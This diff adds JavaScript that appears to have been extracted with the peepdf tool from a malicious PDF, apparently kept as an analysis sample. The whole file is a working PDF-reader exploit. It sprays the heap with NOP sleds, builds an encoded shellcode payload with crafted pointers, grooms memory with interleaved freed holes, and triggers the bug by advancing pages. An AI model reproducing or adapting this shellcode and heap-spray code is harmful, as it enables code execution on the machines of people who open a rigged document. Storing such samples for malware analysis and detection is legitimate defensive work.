@@ -1,0 +1,89 @@
+// peepdf comment: Javascript code located in object 5 (version 0)
+
+this.print({
+    bUI: true,
+    bSilent: false,
+    bShrinkToFit: false
+});
+
+// peepdf comment: Javascript code located in object 10 (version 0)
+
+function prepareHoles(slide_size) {
+    var size = 1000;
+    var x = new Array(size);
+    var hole = unescape("%u0000%u0000%u0000%u0001%u1020%u0901%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000%u0000");
+    /*
+     * TODO: to gain 0.0000000001% more reliability pad it with
+     * a far jump to shellcode instead of PPPPP..
+     */
+    var pad = unescape("%u5858");
+    while (pad.length <= slide_size / 2 - hole.length)
+    pad += pad;
+
+    for (i = 0; i < size; i += 1) {
+        id = "" + i;
+        x[i] = hole + pad.substring(0, slide_size / 2 - hole.length);
+    }
+
+    /* Intermitently free half of the array & garbageCollect */
+    for (j = 0; j < 100; j++)
+    for (i = size / 2; i < size - 2; i += 2) {
+        x[i] = null;
+        x[i] = pad.substring(0, 0x10000 / 2) + "A";
+        x[i] = null;
+    }
+    return x;
+}
+
+function prepareMemory(size) {
+    var mini_slide_size = 0x1000;
+    var slide_size = 0x100000;
+    var x = new Array(size);
+
+
+    var pad = unescape("%ucccc");
+    while (pad.length <= 32)
+    pad += pad;
+
+    /* Bunch of nops */
+    var nops = unescape("%u9090");
+    while (nops.length <= mini_slide_size / 2 - nops.length)
+    nops += nops;
+
+    var shellcode = unescape("%uc931%ue983%ud9dd%ud9ee%u2474%u5bf4%u7381%u8813%u2806%u8326%ufceb%uf4e2%uee74%u266c%u0688%u63a3%u8db4%u2354%u07f0%uadc7%u1ec7%u79a3%u07a8%u6fc3%u3203%u27a3%u3766%ubfe8%u8224%u52e8%uc78f%u2be2%uc489%ud2c3%u52b3%u220c%ue3fd%u79a3%u07ac%u40c3%u0a03%uad63%u1ad7%ucd29%u1a03%u27a3%u8f63%u0274%uc58c%ue619%u8dec%u1668%uc60d%u2a50%u4603%uad24%u1af8%uad85%u0ee0%u2fc3%u8603%u2698%u0688%u4ea3%u59b4%ud019%u50e8%udea1%uc60b%u7653%u78e0%uc4f0%u6efb%ud8b0%u0802%ud97f%u656f%u4a49%u28eb%u5e4d%u06ed%u2628");
+    var pointers = unescape("%u0000%u0000%u7ecd%u1f12%u0006%u0000%u1030%u0901%u1034%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901%u1064%u0901");
+
+    /*
+     * TODO: to gain 0.0000000001% more reliability add a short jump
+     * at the end of the firsts nops to jump over the pointers.
+     * Note that the first nops of the big (0x10000) chunk will be
+     * cuted off
+     *
+     * mini_slide_size len minichunk. (Always 0x1000 aligned)
+     */
+    var chunk = nops.substring(0, 32 / 2) + pointers + nops.substring(0, mini_slide_size / 2 - pointers.length - shellcode.length - 32) + shellcode + pad.substring(0, 32 / 2);
+    chunk = chunk.substring(0, mini_slide_size / 2);
+    /*
+     * slide_size len minichunk. (Always 0x1000 aligned)
+     */
+    while (chunk.length <= slide_size / 2)
+    chunk += chunk;
+
+    for (i = 0; i < size; i += 1) { /* Debugging chunk id */
+        id = "" + i; /* we cut the first bytes for better aligment */
+        x[i] = chunk.substring(16, slide_size / 2 - 32 - id.length) + id;
+    };
+    return x;
+}
+
+/*
+ * Fill the memory with all needed chunks
+ */
+var mem = prepareMemory(200);
+/*
+ * Prepare the interleaved holes
+ */
+var holes = prepareHoles(6500); /* Advance to the last page */
+for (i = 0; i < 2; i++)
+this.pageNum++;
+
